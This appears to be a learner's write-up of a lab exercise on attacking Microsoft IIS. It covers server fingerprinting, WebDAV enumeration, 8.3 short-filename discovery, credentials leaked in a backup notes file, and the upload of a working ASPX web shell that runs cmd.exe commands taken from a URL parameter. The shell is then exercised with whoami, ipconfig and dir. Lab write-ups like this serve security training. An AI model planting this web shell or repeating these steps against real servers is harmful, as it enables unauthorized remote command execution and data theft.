# Web Server Attacks 2

## TASK 1 — Introduction

This room is about **IIS (Internet Information Services)**, Microsoft's web server platform built into Windows Server.

It hosts:

- Websites
- Web Applications
- Various Services

IIS logs HTTP requests using the **W3C logging format**.

---

## TASK 2 — IIS Fingerprinting and Enumeration

### Key Points

- IIS version helps identify applicable CVEs.
- Presence of WebDAV may indicate a direct file upload path.

### Fingerprinting

```http
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
```

### Checking for WebDAV

```bash
curl -X OPTIONS http://venk.lol -sv 2>&1 | grep -E "Allow:|DAV:"
```

Example output:

```text
< Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
< DAV: 1,2,3
```

If you see methods such as `PUT`, `MOVE`, and a `DAV:` header, WebDAV is enabled and should be tested for write access.

---

## TASK 3 — IIS Tilde (Short Filename) Enumeration

The **8.3 filename format** works by:

- Taking the first 6 characters
- Appending `~1`
- Keeping the first 3 characters of the extension

### Examples

| Original Name | 8.3 Format |
|---|---|
| BackupFiles | BACKUP~1 |
| AdminPortal | ADMINI~1 |
| users_backup.xlsx | USERS_~1.XLS |

### Practical

```bash
curl http://10.49.190.8/BackupFiles/
```

Discovered files:

- site-backup.cfg
- web.config
- webdav_notes.txt

Viewing the notes file:

```bash
curl http://10.49.190.8/BackupFiles/webdav_notes.txt
```

Output:

```text
WebDAV setup notes
Directory: /webdav/
Username: webdav_user
Password: P@ssw0rd!123
```

These credentials were used in the next task.

---

## TASK 4 — ASPX Upload and Code Execution

### Requirements

1. WebDAV enabled
2. Valid credentials with write permissions
3. Script execution enabled

### ASPX Web Shell

```aspx
<%@ Page Language="C#" %>
<%
string cmd = Request.QueryString["cmd"];
if (!string.IsNullOrEmpty(cmd)) {
 var proc = new System.Diagnostics.Process();
 proc.StartInfo.FileName = "cmd.exe";
 proc.StartInfo.Arguments = "/c " + cmd;
 proc.StartInfo.UseShellExecute = false;
 proc.StartInfo.RedirectStandardOutput = true;
 proc.Start();
 Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
}
%>
```

Successful upload returned:

```text
201 Created
```

### Testing RCE

```bash
curl "http://10.49.190.8/webdav/cmd.aspx?cmd=whoami"
```

Output:

```text
iis apppool\defaultapppool
```

---

## TASK 5 — ASPX Web Shells

Commands executed:

```bash
curl "http://10.49.190.8/webdav/cmd.aspx?cmd=hostname"
curl "http://10.49.190.8/webdav/cmd.aspx?cmd=ipconfig"
curl "http://10.49.190.8/webdav/cmd.aspx?cmd=dir+C:\\"
```

### Directory Enumeration

The final command revealed:

```text
C:\
├── EFI
├── inetpub
├── Microsoft
├── PerfLogs
├── Program Files
├── Program Files (x86)
├── Users
└── Windows
```

This gives a good understanding of the target's directory structure.

### Next Step

The ASPX shell provides command execution, but it is limited. A reverse shell would provide a much more interactive session for post-exploitation.

---

## Summary

Topics covered:

- IIS Fingerprinting
- WebDAV Enumeration
- 8.3 Short Filename Enumeration
- Credential Discovery
- ASPX Web Shell Uploads
- Remote Code Execution
- Basic Enumeration
